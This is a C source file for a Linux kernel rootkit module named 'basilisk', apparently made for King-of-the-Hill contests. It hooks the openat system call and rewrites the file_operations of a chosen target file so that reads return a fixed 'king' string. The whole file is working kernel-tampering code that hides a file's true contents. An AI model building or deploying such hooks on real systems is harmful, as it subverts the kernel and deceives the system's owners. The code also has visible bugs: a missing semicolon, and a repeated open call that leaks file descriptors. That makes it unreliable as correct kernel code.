#include "include/king.h"

struct file_operations *king_fops = NULL;
DEFINE_RWLOCK(king_fops_lock);

/*
Hook for the read system call. Reads KING into buf and updates the pos pointer.
WARNING:
This function is to be hooked in the f_op struct of the target file.
Hooking it elsewhere will most definetely cause damage to the
system.
*/
static ssize_t read_hook(
    struct file *file, 
    char __user *buf, 
    size_t count,
    loff_t *pos
) {
    int read_len;
    if (*pos == 0 && count >= KING_LEN) { // If pos at start of file, *read* our KING name
      read_len = KING_LEN;
      if (copy_to_user(buf, KING, read_len)) {
        pr_alert("basilisk: copy_to_user failed\n");
        return -EFAULT;
      }
      *pos += read_len; // Use the file offset to handle subsequent reads
      return read_len;
    } else {
      return 0; // Return EOF
    }
}

/*
Chains kern_path and d_path to resolve the final filename that a path
is pointing to. WARNING: Callers should use full_path, not resolved_path, to use
the name!
*/
static long resolve_filename(
    const char __user *filename, 
    char *resolved_path,
    char **full_path
) {
  char kfilename[PATH_MAX];
  struct path path;
  long error;

  error = strncpy_from_user(kfilename, filename, PATH_MAX);
  if (error < 0) {
    pr_err("basilisk: failed to copy string from user space: error code %ld\n",
           error);
    return error;
  }

  error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
  if (error) {
    return error;
  }

  *full_path = d_path(&path, resolved_path, PATH_MAX);
  if (IS_ERR(*full_path)) {
    path_put(&path);
    return PTR_ERR(*full_path);
  }

  error = is_bad_path(
      *full_path, KING_FILENAME,
      KING_FILENAME_LEN); // check if full_path matches KING_FILENAME
  if (error) {
    path_put(&path);
    return error;
  }

  path_put(&path);

  return 0;
}

/* Poisons the file operations structures of given fd to use read_hook as the
 * read syscall */
static long handle_fops_poisoning(int fd, const char *full_path) {
  struct file *file;

  file = fget(fd);
  if (!file) {
    pr_err("basilisk: failed to get file structure from file descriptor\n");
    return -1;
  }

  /* Lazy initialization of king_fops */
  read_lock(&king_fops_lock);
  if (!king_fops) {
    read_unlock(&king_fops_lock);
    write_lock(&king_fops_lock);

    king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
    if (king_fops) {
      king_fops->read = read_hook;
    } else {
      pr_alert("Failed to allocate memory for new file_operations\n");
      write_unlock(&king_fops_lock);
      return -1;
    }
    write_unlock(&king_fops_lock);

  } else {
    read_unlock(&king_fops_lock); // Release read lock in case of already initialized fops
  }

  /* *Poison* targets file fops */
  write_lock(&king_fops_lock);
  file->f_op = king_fops;
  write_unlock(&king_fops_lock);

  fput(file);
  return fd;
}

/*
sys_openat hook.
Resolves the filename from the file descriptor and poisons its file operations
struct if it matches our target file. Otherwise it returns the original openat
syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long (*orig_openat)(const struct pt_regs *);


asmlinkage long hook_openat(const struct pt_regs *regs) {
  const char __user *filename = (char *)regs->si;
  int flags = regs->dx;
  umode_t mode = regs->r10;

  int fd;
  char *full_path;
  char *resolved_path;
  long error;

  resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
  if (!resolved_path) {
    pr_err("basilisk: kmalloc failed");
    return orig_openat(regs); // Return real sys_openat without delay
  }

  /* resolve filename from file descriptor */
  error = resolve_filename(filename, resolved_path, &full_path);
  if (error) {
    kfree(resolved_path) // free resolved_path
    return orig_openat(regs);
  }
  /* poison fops sturct if path matches our target file and fd is not standard
   */
  fd = orig_openat(regs);

  error = is_bad_fd(fd); // check if fd is not standard
  if (error) {
    kfree(resolved_path);
    return orig_openat(regs);
  }

  error = handle_fops_poisoning(fd, full_path);
  if (error == fd) { // fops poisoning succeeded
    kfree(resolved_path);
    return fd;
  }
  kfree(resolved_path);
  return orig_openat(regs);
}
#else
asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags,
                               umode_t mode);
asmlinkage long hook_openat(int dfd, const char __user *filename, int flags,
                            umode_t mode) {
  int fd;
  char *full_path;
  char *resolved_path;
  long error;

  resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
  if (!resolved_path) {
    pr_err("basilisk: kmalloc failed");
    return orig_openat(dfd, filename, flags,
                       mode); // Return real sys_openat without delay
  }

  /* resolve filename from file descriptor */
  error = resolve_filename(filename, resolved_path, &full_path);
  if (error) {
    kfree(resolved_path); // free resolved_path
    return orig_openat(dfd, filename, flags, mode);
  }
  /* poison file operations of our new file descriptor */
  fd = orig_openat(dfd, filename, flags, mode);

  error = is_bad_fd(fd); // check if fd is not standard
  if (error) {
    kfree(resolved_path);
    return orig_openat(dfd, filename, flags, mode);
  }

  error = handle_fops_poisoning(fd, full_path);
  if (error == fd) { // fops poisoning succeeded
    kfree(resolved_path);
    return fd;
  }
  kfree(resolved_path);
  return orig_openat(dfd, filename, flags, mode);
}
#endif